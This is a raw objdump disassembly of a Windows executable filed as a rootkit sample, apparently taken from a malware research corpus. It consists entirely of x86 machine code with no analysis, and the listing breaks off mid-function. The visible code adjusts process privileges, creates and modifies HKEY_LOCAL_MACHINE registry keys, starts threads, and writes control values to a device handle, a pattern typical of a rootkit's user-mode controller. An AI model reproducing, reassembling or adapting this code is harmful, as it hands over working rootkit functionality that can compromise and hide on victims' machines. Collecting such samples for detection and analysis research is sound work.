
malware_samples/rootkit/973e8ee15e00b702b03fa42e45cce60344dbe7dbc7d3213a81a53623c303ff5c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 e4 f8             	and    $0xfffffff8,%esp
  401006:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  40100c:	a1 04 60 41 00       	mov    0x416004,%eax
  401011:	33 c4                	xor    %esp,%eax
  401013:	89 84 24 48 01 00 00 	mov    %eax,0x148(%esp)
  40101a:	53                   	push   %ebx
  40101b:	56                   	push   %esi
  40101c:	57                   	push   %edi
  40101d:	b9 8c 3d 41 00       	mov    $0x413d8c,%ecx
  401022:	e8 c9 16 00 00       	call   0x4026f0
  401027:	68 00 01 00 00       	push   $0x100
  40102c:	8d 44 24 48          	lea    0x48(%esp),%eax
  401030:	c7 44 24 34 1c 01 00 	movl   $0x11c,0x34(%esp)
  401037:	00 
  401038:	6a 00                	push   $0x0
  40103a:	50                   	push   %eax
  40103b:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  401042:	00 
  401043:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%esp)
  40104a:	00 
  40104b:	e8 40 3a 00 00       	call   0x404a90
  401050:	8b 35 0c f1 40 00    	mov    0x40f10c,%esi
  401056:	83 c4 0c             	add    $0xc,%esp
  401059:	33 c0                	xor    %eax,%eax
  40105b:	66 89 84 24 46 01 00 	mov    %ax,0x146(%esp)
  401062:	00 
  401063:	89 84 24 48 01 00 00 	mov    %eax,0x148(%esp)
  40106a:	6a 03                	push   $0x3
  40106c:	6a 20                	push   $0x20
  40106e:	6a 03                	push   $0x3
  401070:	6a 01                	push   $0x1
  401072:	6a 03                	push   $0x3
  401074:	6a 02                	push   $0x2
  401076:	50                   	push   %eax
  401077:	50                   	push   %eax
  401078:	ff d6                	call   *%esi
  40107a:	52                   	push   %edx
  40107b:	50                   	push   %eax
  40107c:	ff d6                	call   *%esi
  40107e:	52                   	push   %edx
  40107f:	50                   	push   %eax
  401080:	ff d6                	call   *%esi
  401082:	52                   	push   %edx
  401083:	50                   	push   %eax
  401084:	6a 23                	push   $0x23
  401086:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  40108a:	c7 44 24 40 0a 00 00 	movl   $0xa,0x40(%esp)
  401091:	00 
  401092:	33 c9                	xor    %ecx,%ecx
  401094:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%esp)
  40109b:	00 
  40109c:	50                   	push   %eax
  40109d:	66 89 8c 24 54 01 00 	mov    %cx,0x154(%esp)
  4010a4:	00 
  4010a5:	ff 15 04 f1 40 00    	call   *0x40f104
  4010ab:	85 c0                	test   %eax,%eax
  4010ad:	74 0a                	je     0x4010b9
  4010af:	b9 a0 3d 41 00       	mov    $0x413da0,%ecx
  4010b4:	e8 37 16 00 00       	call   0x4026f0
  4010b9:	6a 00                	push   $0x0
  4010bb:	e8 42 47 00 00       	call   0x405802
  4010c0:	50                   	push   %eax
  4010c1:	e8 2a 47 00 00       	call   0x4057f0
  4010c6:	8b 3d 08 f1 40 00    	mov    0x40f108,%edi
  4010cc:	83 c4 08             	add    $0x8,%esp
  4010cf:	ff d7                	call   *%edi
  4010d1:	50                   	push   %eax
  4010d2:	6a 00                	push   $0x0
  4010d4:	68 10 04 00 00       	push   $0x410
  4010d9:	ff 15 68 f0 40 00    	call   *0x40f068
  4010df:	8b f0                	mov    %eax,%esi
  4010e1:	85 f6                	test   %esi,%esi
  4010e3:	74 70                	je     0x401155
  4010e5:	8d 44 24 10          	lea    0x10(%esp),%eax
  4010e9:	50                   	push   %eax
  4010ea:	6a 28                	push   $0x28
  4010ec:	56                   	push   %esi
  4010ed:	ff 15 30 f0 40 00    	call   *0x40f030
  4010f3:	85 c0                	test   %eax,%eax
  4010f5:	74 57                	je     0x40114e
  4010f7:	8d 44 24 18          	lea    0x18(%esp),%eax
  4010fb:	50                   	push   %eax
  4010fc:	68 8c 3e 41 00       	push   $0x413e8c
  401101:	6a 00                	push   $0x0
  401103:	ff 15 00 f0 40 00    	call   *0x40f000
  401109:	85 c0                	test   %eax,%eax
  40110b:	74 41                	je     0x40114e
  40110d:	8b 44 24 18          	mov    0x18(%esp),%eax
  401111:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401115:	6a 00                	push   $0x0
  401117:	6a 00                	push   $0x0
  401119:	6a 10                	push   $0x10
  40111b:	89 44 24 30          	mov    %eax,0x30(%esp)
  40111f:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401123:	50                   	push   %eax
  401124:	6a 00                	push   $0x0
  401126:	ff 74 24 24          	push   0x24(%esp)
  40112a:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  401131:	00 
  401132:	89 4c 24 40          	mov    %ecx,0x40(%esp)
  401136:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%esp)
  40113d:	00 
  40113e:	ff 15 08 f0 40 00    	call   *0x40f008
  401144:	85 c0                	test   %eax,%eax
  401146:	74 06                	je     0x40114e
  401148:	ff 15 70 f0 40 00    	call   *0x40f070
  40114e:	56                   	push   %esi
  40114f:	ff 15 18 f1 40 00    	call   *0x40f118
  401155:	68 bc 3d 41 00       	push   $0x413dbc
  40115a:	6a 65                	push   $0x65
  40115c:	6a 00                	push   $0x0
  40115e:	ff 15 e0 f0 40 00    	call   *0x40f0e0
  401164:	8b f0                	mov    %eax,%esi
  401166:	85 f6                	test   %esi,%esi
  401168:	0f 84 98 01 00 00    	je     0x401306
  40116e:	56                   	push   %esi
  40116f:	6a 00                	push   $0x0
  401171:	ff 15 00 f1 40 00    	call   *0x40f100
  401177:	a3 10 73 41 00       	mov    %eax,0x417310
  40117c:	85 c0                	test   %eax,%eax
  40117e:	0f 84 82 01 00 00    	je     0x401306
  401184:	56                   	push   %esi
  401185:	6a 00                	push   $0x0
  401187:	ff 15 84 f0 40 00    	call   *0x40f084
  40118d:	85 c0                	test   %eax,%eax
  40118f:	0f 84 71 01 00 00    	je     0x401306
  401195:	50                   	push   %eax
  401196:	ff 15 78 f0 40 00    	call   *0x40f078
  40119c:	a3 14 73 41 00       	mov    %eax,0x417314
  4011a1:	ff d7                	call   *%edi
  4011a3:	8b c8                	mov    %eax,%ecx
  4011a5:	e8 c6 1d 00 00       	call   0x402f70
  4011aa:	8b 35 48 f0 40 00    	mov    0x40f048,%esi
  4011b0:	8d 44 24 14          	lea    0x14(%esp),%eax
  4011b4:	6a 00                	push   $0x0
  4011b6:	50                   	push   %eax
  4011b7:	6a 00                	push   $0x0
  4011b9:	68 3f 01 0f 00       	push   $0xf013f
  4011be:	6a 00                	push   $0x0
  4011c0:	6a 00                	push   $0x0
  4011c2:	6a 00                	push   $0x0
  4011c4:	68 74 3f 41 00       	push   $0x413f74
  4011c9:	68 02 00 00 80       	push   $0x80000002
  4011ce:	ff d6                	call   *%esi
  4011d0:	85 c0                	test   %eax,%eax
  4011d2:	0f 85 92 00 00 00    	jne    0x40126a
  4011d8:	89 44 24 10          	mov    %eax,0x10(%esp)
  4011dc:	89 44 24 18          	mov    %eax,0x18(%esp)
  4011e0:	8d 44 24 18          	lea    0x18(%esp),%eax
  4011e4:	50                   	push   %eax
  4011e5:	8d 44 24 14          	lea    0x14(%esp),%eax
  4011e9:	50                   	push   %eax
  4011ea:	6a 01                	push   $0x1
  4011ec:	68 28 40 41 00       	push   $0x414028
  4011f1:	ff 15 38 f0 40 00    	call   *0x40f038
  4011f7:	85 c0                	test   %eax,%eax
  4011f9:	74 1a                	je     0x401215
  4011fb:	ff 74 24 10          	push   0x10(%esp)
  4011ff:	6a 04                	push   $0x4
  401201:	ff 74 24 1c          	push   0x1c(%esp)
  401205:	ff 15 2c f0 40 00    	call   *0x40f02c
  40120b:	ff 74 24 10          	push   0x10(%esp)
  40120f:	ff 15 94 f0 40 00    	call   *0x40f094
  401215:	6a 00                	push   $0x0
  401217:	8d 44 24 14          	lea    0x14(%esp),%eax
  40121b:	50                   	push   %eax
  40121c:	6a 00                	push   $0x0
  40121e:	68 3f 01 0f 00       	push   $0xf013f
  401223:	6a 00                	push   $0x0
  401225:	6a 00                	push   $0x0
  401227:	6a 00                	push   $0x0
  401229:	68 c0 3d 41 00       	push   $0x413dc0
  40122e:	ff 74 24 34          	push   0x34(%esp)
  401232:	ff d6                	call   *%esi
  401234:	8b 35 44 f0 40 00    	mov    0x40f044,%esi
  40123a:	85 c0                	test   %eax,%eax
  40123c:	75 26                	jne    0x401264
  40123e:	ff d7                	call   *%edi
  401240:	6a 04                	push   $0x4
  401242:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401246:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40124a:	50                   	push   %eax
  40124b:	6a 04                	push   $0x4
  40124d:	6a 00                	push   $0x0
  40124f:	68 c8 3d 41 00       	push   $0x413dc8
  401254:	ff 74 24 24          	push   0x24(%esp)
  401258:	ff 15 4c f0 40 00    	call   *0x40f04c
  40125e:	ff 74 24 10          	push   0x10(%esp)
  401262:	ff d6                	call   *%esi
  401264:	ff 74 24 14          	push   0x14(%esp)
  401268:	ff d6                	call   *%esi
  40126a:	8b 35 80 f0 40 00    	mov    0x40f080,%esi
  401270:	6a 00                	push   $0x0
  401272:	6a 00                	push   $0x0
  401274:	68 20 13 40 00       	push   $0x401320
  401279:	68 e0 34 40 00       	push   $0x4034e0
  40127e:	6a 00                	push   $0x0
  401280:	6a 00                	push   $0x0
  401282:	ff d6                	call   *%esi
  401284:	6a 08                	push   $0x8
  401286:	e8 d6 24 00 00       	call   0x403761
  40128b:	83 c4 04             	add    $0x4,%esp
  40128e:	c7 00 64 00 00 00    	movl   $0x64,(%eax)
  401294:	6a 00                	push   $0x0
  401296:	6a 00                	push   $0x0
  401298:	50                   	push   %eax
  401299:	68 80 35 40 00       	push   $0x403580
  40129e:	6a 00                	push   $0x0
  4012a0:	6a 00                	push   $0x0
  4012a2:	c7 40 04 40 13 40 00 	movl   $0x401340,0x4(%eax)
  4012a9:	ff d6                	call   *%esi
  4012ab:	6a 00                	push   $0x0
  4012ad:	6a 00                	push   $0x0
  4012af:	68 60 13 40 00       	push   $0x401360
  4012b4:	68 40 36 40 00       	push   $0x403640
  4012b9:	6a 00                	push   $0x0
  4012bb:	6a 00                	push   $0x0
  4012bd:	ff d6                	call   *%esi
  4012bf:	e8 4c 1d 00 00       	call   0x403010
  4012c4:	8b f8                	mov    %eax,%edi
  4012c6:	33 f6                	xor    %esi,%esi
  4012c8:	8b 0f                	mov    (%edi),%ecx
  4012ca:	39 31                	cmp    %esi,(%ecx)
  4012cc:	76 22                	jbe    0x4012f0
  4012ce:	8b 1d fc f1 40 00    	mov    0x40f1fc,%ebx
  4012d4:	8b 41 0c             	mov    0xc(%ecx),%eax
  4012d7:	6a 05                	push   $0x5
  4012d9:	6a 00                	push   $0x0
  4012db:	6a 00                	push   $0x0
  4012dd:	ff 34 b0             	push   (%eax,%esi,4)
  4012e0:	68 d4 3d 41 00       	push   $0x413dd4
  4012e5:	6a 00                	push   $0x0
  4012e7:	ff d3                	call   *%ebx
  4012e9:	8b 0f                	mov    (%edi),%ecx
  4012eb:	46                   	inc    %esi
  4012ec:	3b 31                	cmp    (%ecx),%esi
  4012ee:	72 e4                	jb     0x4012d4
  4012f0:	8b cf                	mov    %edi,%ecx
  4012f2:	e8 59 20 00 00       	call   0x403350
  4012f7:	8b 35 1c f1 40 00    	mov    0x40f11c,%esi
  4012fd:	0f 1f 00             	nopl   (%eax)
  401300:	6a 64                	push   $0x64
  401302:	ff d6                	call   *%esi
  401304:	eb fa                	jmp    0x401300
  401306:	8b 8c 24 54 01 00 00 	mov    0x154(%esp),%ecx
  40130d:	33 c0                	xor    %eax,%eax
  40130f:	5f                   	pop    %edi
  401310:	5e                   	pop    %esi
  401311:	5b                   	pop    %ebx
  401312:	33 cc                	xor    %esp,%ecx
  401314:	e8 2c 24 00 00       	call   0x403745
  401319:	8b e5                	mov    %ebp,%esp
  40131b:	5d                   	pop    %ebp
  40131c:	c2 10 00             	ret    $0x10
  40131f:	cc                   	int3
  401320:	55                   	push   %ebp
  401321:	8b ec                	mov    %esp,%ebp
  401323:	83 3d 18 73 41 00 00 	cmpl   $0x0,0x417318
  40132a:	75 0e                	jne    0x40133a
  40132c:	6a 00                	push   $0x0
  40132e:	51                   	push   %ecx
  40132f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401332:	e8 69 0e 00 00       	call   0x4021a0
  401337:	83 c4 08             	add    $0x8,%esp
  40133a:	5d                   	pop    %ebp
  40133b:	c3                   	ret
  40133c:	cc                   	int3
  40133d:	cc                   	int3
  40133e:	cc                   	int3
  40133f:	cc                   	int3
  401340:	55                   	push   %ebp
  401341:	8b ec                	mov    %esp,%ebp
  401343:	83 3d 18 73 41 00 00 	cmpl   $0x0,0x417318
  40134a:	75 0e                	jne    0x40135a
  40134c:	6a 01                	push   $0x1
  40134e:	51                   	push   %ecx
  40134f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401352:	e8 49 0e 00 00       	call   0x4021a0
  401357:	83 c4 08             	add    $0x8,%esp
  40135a:	5d                   	pop    %ebp
  40135b:	c3                   	ret
  40135c:	cc                   	int3
  40135d:	cc                   	int3
  40135e:	cc                   	int3
  40135f:	cc                   	int3
  401360:	55                   	push   %ebp
  401361:	8b ec                	mov    %esp,%ebp
  401363:	81 ec 00 0a 00 00    	sub    $0xa00,%esp
  401369:	a1 04 60 41 00       	mov    0x416004,%eax
  40136e:	33 c5                	xor    %ebp,%eax
  401370:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401373:	53                   	push   %ebx
  401374:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401377:	56                   	push   %esi
  401378:	8b 75 0c             	mov    0xc(%ebp),%esi
  40137b:	57                   	push   %edi
  40137c:	81 fb 01 20 00 00    	cmp    $0x2001,%ebx
  401382:	0f 87 91 04 00 00    	ja     0x401819
  401388:	0f 84 01 03 00 00    	je     0x40168f
  40138e:	8d 83 ff ef ff ff    	lea    -0x1001(%ebx),%eax
  401394:	83 f8 03             	cmp    $0x3,%eax
  401397:	0f 87 c2 09 00 00    	ja     0x401d5f
  40139d:	ff 24 85 70 1d 40 00 	jmp    *0x401d70(,%eax,4)
  4013a4:	6a 00                	push   $0x0
  4013a6:	33 d2                	xor    %edx,%edx
  4013a8:	8b cb                	mov    %ebx,%ecx
  4013aa:	e8 d1 09 00 00       	call   0x401d80
  4013af:	83 c4 04             	add    $0x4,%esp
  4013b2:	6a 00                	push   $0x0
  4013b4:	ff 15 10 f1 40 00    	call   *0x40f110
  4013ba:	8d 85 0c f6 ff ff    	lea    -0x9f4(%ebp),%eax
  4013c0:	89 9d 18 f6 ff ff    	mov    %ebx,-0x9e8(%ebp)
  4013c6:	50                   	push   %eax
  4013c7:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  4013cd:	50                   	push   %eax
  4013ce:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  4013d4:	85 c0                	test   %eax,%eax
  4013d6:	74 4a                	je     0x401422
  4013d8:	83 bd 0c f6 ff ff 00 	cmpl   $0x0,-0x9f4(%ebp)
  4013df:	74 41                	je     0x401422
  4013e1:	6a 00                	push   $0x0
  4013e3:	6a 00                	push   $0x0
  4013e5:	6a 03                	push   $0x3
  4013e7:	6a 00                	push   $0x0
  4013e9:	6a 00                	push   $0x0
  4013eb:	68 00 00 00 c0       	push   $0xc0000000
  4013f0:	68 28 3e 41 00       	push   $0x413e28
  4013f5:	ff 15 20 f1 40 00    	call   *0x40f120
  4013fb:	8b f0                	mov    %eax,%esi
  4013fd:	83 fe ff             	cmp    $0xffffffff,%esi
  401400:	74 20                	je     0x401422
  401402:	6a 00                	push   $0x0
  401404:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  40140a:	50                   	push   %eax
  40140b:	6a 04                	push   $0x4
  40140d:	8d 85 18 f6 ff ff    	lea    -0x9e8(%ebp),%eax
  401413:	50                   	push   %eax
  401414:	56                   	push   %esi
  401415:	ff 15 24 f1 40 00    	call   *0x40f124
  40141b:	56                   	push   %esi
  40141c:	ff 15 18 f1 40 00    	call   *0x40f118
  401422:	8b 35 50 f0 40 00    	mov    0x40f050,%esi
  401428:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  40142e:	50                   	push   %eax
  40142f:	68 3f 02 0f 00       	push   $0xf023f
  401434:	6a 00                	push   $0x0
  401436:	68 e0 3d 41 00       	push   $0x413de0
  40143b:	68 02 00 00 80       	push   $0x80000002
  401440:	ff d6                	call   *%esi
  401442:	85 c0                	test   %eax,%eax
  401444:	75 11                	jne    0x401457
  401446:	68 f4 3d 41 00       	push   $0x413df4
  40144b:	ff b5 10 f6 ff ff    	push   -0x9f0(%ebp)
  401451:	ff 15 54 f0 40 00    	call   *0x40f054
  401457:	6a 00                	push   $0x0
  401459:	ff 15 18 f2 40 00    	call   *0x40f218
  40145f:	85 c0                	test   %eax,%eax
  401461:	78 4c                	js     0x4014af
  401463:	8d 85 1c f6 ff ff    	lea    -0x9e4(%ebp),%eax
  401469:	c7 85 1c f6 ff ff 00 	movl   $0x0,-0x9e4(%ebp)
  401470:	00 00 00 
  401473:	50                   	push   %eax
  401474:	68 7c 3e 41 00       	push   $0x413e7c
  401479:	6a 01                	push   $0x1
  40147b:	6a 00                	push   $0x0
  40147d:	68 6c 3e 41 00       	push   $0x413e6c
  401482:	ff 15 14 f2 40 00    	call   *0x40f214
  401488:	85 c0                	test   %eax,%eax
  40148a:	78 1d                	js     0x4014a9
  40148c:	8b 85 1c f6 ff ff    	mov    -0x9e4(%ebp),%eax
  401492:	68 10 3e 41 00       	push   $0x413e10
  401497:	50                   	push   %eax
  401498:	8b 08                	mov    (%eax),%ecx
  40149a:	ff 51 1c             	call   *0x1c(%ecx)
  40149d:	8b 85 1c f6 ff ff    	mov    -0x9e4(%ebp),%eax
  4014a3:	50                   	push   %eax
  4014a4:	8b 08                	mov    (%eax),%ecx
  4014a6:	ff 51 08             	call   *0x8(%ecx)
  4014a9:	ff 15 1c f2 40 00    	call   *0x40f21c
  4014af:	e8 4c 1a 00 00       	call   0x402f00
  4014b4:	8d 85 1c f6 ff ff    	lea    -0x9e4(%ebp),%eax
  4014ba:	50                   	push   %eax
  4014bb:	68 3f 01 0f 00       	push   $0xf013f
  4014c0:	6a 00                	push   $0x0
  4014c2:	68 74 3f 41 00       	push   $0x413f74
  4014c7:	68 02 00 00 80       	push   $0x80000002
  4014cc:	ff d6                	call   *%esi
  4014ce:	85 c0                	test   %eax,%eax
  4014d0:	0f 85 83 00 00 00    	jne    0x401559
  4014d6:	8b 35 28 f0 40 00    	mov    0x40f028,%esi
  4014dc:	50                   	push   %eax
  4014dd:	50                   	push   %eax
  4014de:	50                   	push   %eax
  4014df:	50                   	push   %eax
  4014e0:	8d 85 18 f6 ff ff    	lea    -0x9e8(%ebp),%eax
  4014e6:	c7 85 18 f6 ff ff e8 	movl   $0x3e8,-0x9e8(%ebp)
  4014ed:	03 00 00 
  4014f0:	50                   	push   %eax
  4014f1:	8d 85 20 f6 ff ff    	lea    -0x9e0(%ebp),%eax
  4014f7:	50                   	push   %eax
  4014f8:	6a 00                	push   $0x0
  4014fa:	ff b5 1c f6 ff ff    	push   -0x9e4(%ebp)
  401500:	ff d6                	call   *%esi
  401502:	85 c0                	test   %eax,%eax
  401504:	75 47                	jne    0x40154d
  401506:	8b 3d 18 f0 40 00    	mov    0x40f018,%edi
  40150c:	0f 1f 40 00          	nopl   0x0(%eax)
  401510:	8d 85 20 f6 ff ff    	lea    -0x9e0(%ebp),%eax
  401516:	50                   	push   %eax
  401517:	ff b5 1c f6 ff ff    	push   -0x9e4(%ebp)
  40151d:	ff d7                	call   *%edi
  40151f:	6a 00                	push   $0x0
  401521:	6a 00                	push   $0x0
  401523:	6a 00                	push   $0x0
  401525:	6a 00                	push   $0x0
  401527:	8d 85 18 f6 ff ff    	lea    -0x9e8(%ebp),%eax
  40152d:	c7 85 18 f6 ff ff e8 	movl   $0x3e8,-0x9e8(%ebp)
  401534:	03 00 00 
  401537:	50                   	push   %eax
  401538:	8d 85 20 f6 ff ff    	lea    -0x9e0(%ebp),%eax
  40153e:	50                   	push   %eax
  40153f:	6a 00                	push   $0x0
  401541:	ff b5 1c f6 ff ff    	push   -0x9e4(%ebp)
  401547:	ff d6                	call   *%esi
  401549:	85 c0                	test   %eax,%eax
  40154b:	74 c3                	je     0x401510
  40154d:	ff b5 1c f6 ff ff    	push   -0x9e4(%ebp)
  401553:	ff 15 44 f0 40 00    	call   *0x40f044
  401559:	6a 00                	push   $0x0
  40155b:	68 3f 01 0f 00       	push   $0xf013f
  401560:	68 74 3f 41 00       	push   $0x413f74
  401565:	68 02 00 00 80       	push   $0x80000002
  40156a:	ff 15 0c f0 40 00    	call   *0x40f00c
  401570:	83 c9 ff             	or     $0xffffffff,%ecx
  401573:	e8 f8 19 00 00       	call   0x402f70
  401578:	5f                   	pop    %edi
  401579:	5e                   	pop    %esi
  40157a:	5b                   	pop    %ebx
  40157b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40157e:	33 cd                	xor    %ebp,%ecx
  401580:	e8 c0 21 00 00       	call   0x403745
  401585:	8b e5                	mov    %ebp,%esp
  401587:	5d                   	pop    %ebp
  401588:	c3                   	ret
  401589:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  40158f:	89 9d 0c f6 ff ff    	mov    %ebx,-0x9f4(%ebp)
  401595:	50                   	push   %eax
  401596:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  40159c:	50                   	push   %eax
  40159d:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  4015a3:	85 c0                	test   %eax,%eax
  4015a5:	74 4a                	je     0x4015f1
  4015a7:	83 bd 10 f6 ff ff 00 	cmpl   $0x0,-0x9f0(%ebp)
  4015ae:	74 41                	je     0x4015f1
  4015b0:	6a 00                	push   $0x0
  4015b2:	6a 00                	push   $0x0
  4015b4:	6a 03                	push   $0x3
  4015b6:	6a 00                	push   $0x0
  4015b8:	6a 00                	push   $0x0
  4015ba:	68 00 00 00 c0       	push   $0xc0000000
  4015bf:	68 28 3e 41 00       	push   $0x413e28
  4015c4:	ff 15 20 f1 40 00    	call   *0x40f120
  4015ca:	8b f0                	mov    %eax,%esi
  4015cc:	83 fe ff             	cmp    $0xffffffff,%esi
  4015cf:	74 20                	je     0x4015f1
  4015d1:	6a 00                	push   $0x0
  4015d3:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  4015d9:	50                   	push   %eax
  4015da:	6a 04                	push   $0x4
  4015dc:	8d 85 0c f6 ff ff    	lea    -0x9f4(%ebp),%eax
  4015e2:	50                   	push   %eax
  4015e3:	56                   	push   %esi
  4015e4:	ff 15 24 f1 40 00    	call   *0x40f124
  4015ea:	56                   	push   %esi
  4015eb:	ff 15 18 f1 40 00    	call   *0x40f118
  4015f1:	5f                   	pop    %edi
  4015f2:	5e                   	pop    %esi
  4015f3:	c7 05 18 73 41 00 01 	movl   $0x1,0x417318
  4015fa:	00 00 00 
  4015fd:	5b                   	pop    %ebx
  4015fe:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401601:	33 cd                	xor    %ebp,%ecx
  401603:	e8 3d 21 00 00       	call   0x403745
  401608:	8b e5                	mov    %ebp,%esp
  40160a:	5d                   	pop    %ebp
  40160b:	c3                   	ret
  40160c:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  401612:	89 9d 0c f6 ff ff    	mov    %ebx,-0x9f4(%ebp)
  401618:	50                   	push   %eax
  401619:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  40161f:	50                   	push   %eax
  401620:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  401626:	85 c0                	test   %eax,%eax
  401628:	74 4a                	je     0x401674
  40162a:	83 bd 10 f6 ff ff 00 	cmpl   $0x0,-0x9f0(%ebp)
  401631:	74 41                	je     0x401674
  401633:	6a 00                	push   $0x0
  401635:	6a 00                	push   $0x0
  401637:	6a 03                	push   $0x3
  401639:	6a 00                	push   $0x0
  40163b:	6a 00                	push   $0x0
  40163d:	68 00 00 00 c0       	push   $0xc0000000
  401642:	68 28 3e 41 00       	push   $0x413e28
  401647:	ff 15 20 f1 40 00    	call   *0x40f120
  40164d:	8b f0                	mov    %eax,%esi
  40164f:	83 fe ff             	cmp    $0xffffffff,%esi
  401652:	74 20                	je     0x401674
  401654:	6a 00                	push   $0x0
  401656:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  40165c:	50                   	push   %eax
  40165d:	6a 04                	push   $0x4
  40165f:	8d 85 0c f6 ff ff    	lea    -0x9f4(%ebp),%eax
  401665:	50                   	push   %eax
  401666:	56                   	push   %esi
  401667:	ff 15 24 f1 40 00    	call   *0x40f124
  40166d:	56                   	push   %esi
  40166e:	ff 15 18 f1 40 00    	call   *0x40f118
  401674:	5f                   	pop    %edi
  401675:	5e                   	pop    %esi
  401676:	c7 05 18 73 41 00 00 	movl   $0x0,0x417318
  40167d:	00 00 00 
  401680:	5b                   	pop    %ebx
  401681:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401684:	33 cd                	xor    %ebp,%ecx
  401686:	e8 ba 20 00 00       	call   0x403745
  40168b:	8b e5                	mov    %ebp,%esp
  40168d:	5d                   	pop    %ebp
  40168e:	c3                   	ret
  40168f:	6a 00                	push   $0x0
  401691:	8d 85 10 f6 ff ff    	lea    -0x9f0(%ebp),%eax
  401697:	50                   	push   %eax
  401698:	6a 04                	push   $0x4
  40169a:	8d 85 04 f6 ff ff    	lea    -0x9fc(%ebp),%eax
  4016a0:	50                   	push   %eax
  4016a1:	56                   	push   %esi
  4016a2:	ff 15 2c f1 40 00    	call   *0x40f12c
  4016a8:	85 c0                	test   %eax,%eax
  4016aa:	0f 84 af 06 00 00    	je     0x401d5f
  4016b0:	83 bd 10 f6 ff ff 04 	cmpl   $0x4,-0x9f0(%ebp)
  4016b7:	0f 85 a2 06 00 00    	jne    0x401d5f
  4016bd:	8b bd 04 f6 ff ff    	mov    -0x9fc(%ebp),%edi
  4016c3:	8d 85 0c f6 ff ff    	lea    -0x9f4(%ebp),%eax
  4016c9:	50                   	push   %eax
  4016ca:	c7 85 18 f6 ff ff 00 	movl   $0x0,-0x9e8(%ebp)
  4016d1:	00 00 00 
  4016d4:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  4016da:	8b 35 d0 f0 40 00    	mov    0x40f0d0,%esi
  4016e0:	50                   	push   %eax
  4016e1:	ff d6                	call   *%esi
  4016e3:	85 c0                	test   %eax,%eax
  4016e5:	0f 84 0c 01 00 00    	je     0x4017f7
  4016eb:	83 bd 0c f6 ff ff 00 	cmpl   $0x0,-0x9f4(%ebp)
  4016f2:	0f 84 ff 00 00 00    	je     0x4017f7
  4016f8:	57                   	push   %edi
  4016f9:	6a 00                	push   $0x0
  4016fb:	68 00 10 00 00       	push   $0x1000
  401700:	ff 15 68 f0 40 00    	call   *0x40f068
  401706:	8b f8                	mov    %eax,%edi
  401708:	85 ff                	test   %edi,%edi
  40170a:	0f 84 4f 06 00 00    	je     0x401d5f
  401710:	8d 85 1c f6 ff ff    	lea    -0x9e4(%ebp),%eax
  401716:	50                   	push   %eax
  401717:	57                   	push   %edi
  401718:	ff d6                	call   *%esi
  40171a:	85 c0                	test   %eax,%eax
  40171c:	74 1b                	je     0x401739
  40171e:	33 c0                	xor    %eax,%eax
  401720:	c7 85 18 f6 ff ff 01 	movl   $0x1,-0x9e8(%ebp)
  401727:	00 00 00 
  40172a:	39 85 1c f6 ff ff    	cmp    %eax,-0x9e4(%ebp)
  401730:	0f 94 c0             	sete   %al
  401733:	89 85 14 f6 ff ff    	mov    %eax,-0x9ec(%ebp)
  401739:	8b b5 14 f6 ff ff    	mov    -0x9ec(%ebp),%esi
  40173f:	57                   	push   %edi
  401740:	ff 15 18 f1 40 00    	call   *0x40f118
  401746:	83 bd 18 f6 ff ff 00 	cmpl   $0x0,-0x9e8(%ebp)
  40174d:	0f 84 0c 06 00 00    	je     0x401d5f
  401753:	85 f6                	test   %esi,%esi
  401755:	0f 84 9c 00 00 00    	je     0x4017f7
  40175b:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  401761:	89 9d 0c f6 ff ff    	mov    %ebx,-0x9f4(%ebp)
  401767:	50                   	push   %eax
  401768:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  40176e:	50                   	push   %eax
  40176f:	ff 15 d0 f0 40 00    	call   *0x40f0d0
  401775:	85 c0                	test   %eax,%eax
  401777:	0f 84 e2 05 00 00    	je     0x401d5f
  40177d:	83 bd 14 f6 ff ff 00 	cmpl   $0x0,-0x9ec(%ebp)
  401784:	0f 84 d5 05 00 00    	je     0x401d5f
  40178a:	6a 00                	push   $0x0
  40178c:	6a 00                	push   $0x0
  40178e:	6a 03                	push   $0x3
  401790:	6a 00                	push   $0x0
  401792:	6a 00                	push   $0x0
  401794:	68 00 00 00 c0       	push   $0xc0000000
  401799:	68 28 3e 41 00       	push   $0x413e28
  40179e:	ff 15 20 f1 40 00    	call   *0x40f120
  4017a4:	8b f8                	mov    %eax,%edi
  4017a6:	83 ff ff             	cmp    $0xffffffff,%edi
  4017a9:	0f 84 b0 05 00 00    	je     0x401d5f
  4017af:	8b 35 24 f1 40 00    	mov    0x40f124,%esi
  4017b5:	8d 85 14 f6 ff ff    	lea    -0x9ec(%ebp),%eax
  4017bb:	6a 00                	push   $0x0
  4017bd:	50                   	push   %eax
  4017be:	6a 04                	push   $0x4
